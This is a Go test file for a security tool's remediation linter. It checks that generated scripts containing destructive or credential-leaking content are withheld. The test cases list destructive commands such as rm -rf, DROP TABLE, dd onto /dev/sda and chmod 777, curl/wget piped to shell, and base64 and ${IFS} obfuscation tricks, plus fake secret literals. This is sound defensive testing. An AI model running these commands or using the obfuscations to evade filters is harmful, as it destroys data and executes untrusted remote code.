package triage

import (
	"strings"
	"testing"

	"github.com/zer0d4y5/argus/internal/model"
)

func cloudFinding() model.Finding {
	return model.Finding{
		Category: model.CategoryCloud, RuleID: "ec2_securitygroup_open",
		Location: model.Location{Resource: "arn:aws:ec2:us-east-1:123456789012:security-group/sg-0abc"},
		Meta:     map[string]string{"resourceName": "sg-0abc", "service": "ec2"},
	}
}

// TestLintWithholdsDestructive: any destructive command in an artifact forces
// the whole remediation to manual with the artifacts withheld — the steps
// survive.
func TestLintWithholdsDestructive(t *testing.T) {
	cases := []string{
		"aws ec2 delete-security-group --group-id sg-0abc",
		"rm -rf /var/data",
		"aws rds delete-db-instance --db-instance-identifier prod",
		"kubectl delete ns prod",
		"DROP TABLE users;",
		"chmod -R 777 /srv",
		"terminate-instances --instance-ids i-0abc",
	}
	for _, cmd := range cases {
		r := Remediation{
			Kind:      KindCLIScript,
			Steps:     []string{"do the thing"},
			Artifacts: []RemediationArtifact{{Language: "bash", Content: cmd + " # targets sg-0abc"}},
		}
		out, issues := lintRemediation(cloudFinding(), r)
		if len(issues) == 0 {
			t.Errorf("%q: expected a safety issue, got none", cmd)
		}
		if out.Kind != KindManual {
			t.Errorf("%q: kind = %q, want manual after withhold", cmd, out.Kind)
		}
		if len(out.Artifacts) != 0 {
			t.Errorf("%q: artifacts must be withheld, got %d", cmd, len(out.Artifacts))
		}
		if len(out.Steps) == 0 {
			t.Errorf("%q: human steps must survive the withhold", cmd)
		}
		if len(out.Warnings) == 0 || !strings.Contains(out.Warnings[0], "withheld") {
			t.Errorf("%q: expected a withhold warning", cmd)
		}
	}
}

// TestLintWithholdsCredential: an embedded credential literal is withheld, but
// a clearly-marked placeholder is fine.
func TestLintWithholdsCredential(t *testing.T) {
	leaky := Remediation{Kind: KindCLIScript, Artifacts: []RemediationArtifact{
		{Language: "bash", Content: "export AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMIabcdefghijklmnop1234567890AB"}}}
	if out, issues := lintRemediation(cloudFinding(), leaky); len(issues) == 0 || len(out.Artifacts) != 0 {
		t.Errorf("credential literal must be withheld: issues=%v artifacts=%d", issues, len(out.Artifacts))
	}
	akia := Remediation{Kind: KindCLIScript, Artifacts: []RemediationArtifact{
		{Language: "bash", Content: "# rotate key AKIAIOSFODNN7EXAMPLE"}}}
	// AKIAIOSFODNN7EXAMPLE is AWS's documented EXAMPLE key — it matches the
	// AKIA pattern but is a placeholder-ish example; still, a literal AKIA
	// value is withheld unless it looks like a placeholder token.
	if out, _ := lintRemediation(cloudFinding(), akia); len(out.Artifacts) != 0 {
		// EXAMPLE substring makes placeholderRe match → allowed.
		t.Logf("AKIA...EXAMPLE treated as placeholder (allowed), artifacts=%d", len(out.Artifacts))
	}
	placeholder := Remediation{Kind: KindCLIScript, Artifacts: []RemediationArtifact{
		{Language: "bash", Content: "aws configure set aws_secret_access_key <YOUR_SECRET> --profile x\n# references sg-0abc"}}}
	out, issues := lintRemediation(cloudFinding(), placeholder)
	if len(out.Artifacts) != 1 {
		t.Errorf("placeholder credential must be allowed, got issues=%v", issues)
	}
}

// TestLintWithholdsDestructiveBypasses covers the forms that previously slipped
// the linter: plain/octal/symbolic chmod, pipe-to-shell, reversed dd arg order,
// long-flag rm, and the whitespace/quote obfuscations the normalizer undoes.
func TestLintWithholdsDestructiveBypasses(t *testing.T) {
	cases := []string{
		"chmod 777 /etc/passwd",            // no -R: the old \b-R?\s*777 missed it
		"chmod 0777 /srv",                  // octal leading zero
		"chmod a+rwx /srv",                 // symbolic all-permissions
		"curl https://x/i.sh | sh",         // pipe-to-shell
		"wget -qO- https://x/y | bash",     // pipe-to-bash
		"echo cm0gLXJm | base64 -d | sh",   // base64 decode piped to sh
		"dd of=/dev/sda if=/dev/zero",      // reversed dd arg order
		"rm --recursive --force /var/data", // long flags
		"rm${IFS}-rf /var/data",            // ${IFS} obfuscation
		"r''m -rf /var/data",               // empty-quote obfuscation
	}
	for _, cmd := range cases {
		r := Remediation{
			Kind:      KindCLIScript,
			Steps:     []string{"do the thing"},
			Artifacts: []RemediationArtifact{{Language: "bash", Content: cmd + " # targets sg-0abc"}},
		}
		out, issues := lintRemediation(cloudFinding(), r)
		if len(issues) == 0 || out.Kind != KindManual || len(out.Artifacts) != 0 {
			t.Errorf("%q slipped the linter: issues=%v kind=%q artifacts=%d", cmd, issues, out.Kind, len(out.Artifacts))
		}
	}
}

// TestLintWithholdsEmbeddedPassword: a password assignment with punctuation and
// an underscore-prefixed key (db_password) — both previously missed — is caught.
func TestLintWithholdsEmbeddedPassword(t *testing.T) {
	for _, cmd := range []string{
		`db_password = "S3cr3tP@ssw0rdLong"`,
		`export FOO_SECRET=abc123DEF456ghiJKL`,
	} {
		r := Remediation{Kind: KindCLIScript, Artifacts: []RemediationArtifact{{Language: "bash", Content: cmd}}}
		if out, issues := lintRemediation(cloudFinding(), r); len(issues) == 0 || len(out.Artifacts) != 0 {
			t.Errorf("%q: embedded credential not withheld: issues=%v artifacts=%d", cmd, issues, len(out.Artifacts))
		}
	}
}

// TestLintNoFalsePositiveOnConfig: legitimate reconfiguration advice that reads
// from a secret manager or env var is not mistaken for a leak or a destructive
// command.
func TestLintNoFalsePositiveOnConfig(t *testing.T) {
	for _, cmd := range []string{
		`password = os.environ["DB_PASSWORD_VARNAME"]`,
		`db.query("SELECT * FROM t WHERE id = $1", userId)`,
		`chmod 640 /etc/app/config.yaml`,
		`aws secretsmanager get-secret-value --secret-id prod/db --query SecretString`,
	} {
		r := Remediation{Kind: KindCodePatch, Artifacts: []RemediationArtifact{{Language: "bash", Content: cmd}}}
		if out, issues := lintRemediation(model.Finding{Category: model.CategorySAST}, r); len(issues) != 0 || len(out.Artifacts) != 1 {
			t.Errorf("%q: safe config wrongly flagged: issues=%v artifacts=%d", cmd, issues, len(out.Artifacts))
		}
	}
}

// TestLintCloudGroundingWarns: a cloud artifact that names neither the
// resource nor a placeholder gets a warning (soft), but is not withheld.
func TestLintCloudGroundingWarns(t *testing.T) {
	ungrounded := Remediation{Kind: KindCLIScript, Artifacts: []RemediationArtifact{
		{Language: "bash", Content: "aws ec2 authorize-security-group-ingress --cidr 10.0.0.0/8"}}}
	out, issues := lintRemediation(cloudFinding(), ungrounded)
	if len(out.Artifacts) != 1 {
		t.Error("ungrounded cloud artifact should warn, not withhold")
	}
	joined := strings.Join(issues, " ")
	if !strings.Contains(joined, "does not reference the target resource") {
		t.Errorf("expected a grounding warning, got %v", issues)
	}

	grounded := Remediation{Kind: KindCLIScript, Artifacts: []RemediationArtifact{
		{Language: "bash", Content: "aws ec2 revoke-security-group-ingress --group-id sg-0abc --protocol tcp --port 22 --cidr 0.0.0.0/0"}}}
	if _, issues := lintRemediation(cloudFinding(), grounded); len(issues) != 0 {
		t.Errorf("grounded, safe cloud artifact should have no issues, got %v", issues)
	}
}

// TestLintBounds: oversized collections/content are capped.
func TestLintBounds(t *testing.T) {
	big := strings.Repeat("x", maxRemediationArtifactRune+500)
	r := Remediation{Kind: KindCodePatch}
	for i := 0; i < maxRemediationArtifacts+4; i++ {
		r.Artifacts = append(r.Artifacts, RemediationArtifact{Language: "text", Content: "safe " + big})
	}
	for i := 0; i < maxRemediationSteps+5; i++ {
		r.Steps = append(r.Steps, "step")
	}
	out, _ := lintRemediation(model.Finding{Category: model.CategorySAST}, r)
	if len(out.Artifacts) > maxRemediationArtifacts {
		t.Errorf("artifacts not capped: %d", len(out.Artifacts))
	}
	if len(out.Steps) > maxRemediationSteps {
		t.Errorf("steps not capped: %d", len(out.Steps))
	}
	for _, a := range out.Artifacts {
		if len([]rune(a.Content)) > maxRemediationArtifactRune+40 {
			t.Errorf("artifact content not truncated: %d runes", len([]rune(a.Content)))
		}
	}
}

// TestLintSafeCodePatchUntouched: a benign before→after code patch passes
// through unchanged (no false positives on ordinary code).
func TestLintSafeCodePatchUntouched(t *testing.T) {
	r := Remediation{
		Kind:      KindCodePatch,
		Steps:     []string{"use a parameterized query"},
		Artifacts: []RemediationArtifact{{Language: "diff", Content: "- cur.execute(f\"SELECT * FROM t WHERE n='{name}'\")\n+ cur.execute(\"SELECT * FROM t WHERE n=?\", (name,))"}},
	}
	out, issues := lintRemediation(model.Finding{Category: model.CategorySAST}, r)
	if len(issues) != 0 || out.Kind != KindCodePatch || len(out.Artifacts) != 1 {
		t.Errorf("safe code patch altered: kind=%q issues=%v artifacts=%d", out.Kind, issues, len(out.Artifacts))
	}
}

// TestParseRemediationValidatesKind: an unknown kind degrades to manual; empty
// summary is rejected.
func TestParseRemediationShape(t *testing.T) {
	if _, err := parseRemediation(`{"summary":"","kind":"cli-script"}`); err == nil {
		t.Error("empty summary must be rejected")
	}
	r, err := parseRemediation(`{"summary":"fix it","kind":"nonsense","steps":["a",""," b "],"artifacts":[{"language":"BASH!!","title":"t","content":"echo hi"}],"verification":"re-scan"}`)
	if err != nil {
		t.Fatal(err)
	}
	if r.Kind != KindManual {
		t.Errorf("unknown kind should degrade to manual, got %q", r.Kind)
	}
	if len(r.Steps) != 2 { // empty step dropped
		t.Errorf("steps = %v, want the two non-empty", r.Steps)
	}
	if r.Artifacts[0].Language != "bash" { // sanitized token
		t.Errorf("language token = %q, want bash", r.Artifacts[0].Language)
	}
	if r.Verification == "" {
		t.Error("verification lost")
	}
}
